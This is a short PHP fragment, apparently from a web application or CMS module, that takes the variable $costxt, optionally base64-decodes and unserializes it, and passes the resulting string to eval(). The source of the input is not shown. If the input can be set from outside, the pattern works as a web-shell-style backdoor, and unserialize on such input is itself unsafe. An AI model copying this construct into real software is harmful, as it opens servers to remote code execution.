<?
	if (substr($costxt,0,7)=='base64:') 
	{
		$php_eval=unserialize(base64_decode(substr($costxt,7)));
	}
	else
	{
		$php_eval[php]=stripslashes($costxt);
	}

	if (strlen($php_eval[php])) eval($php_eval[php].";");
?>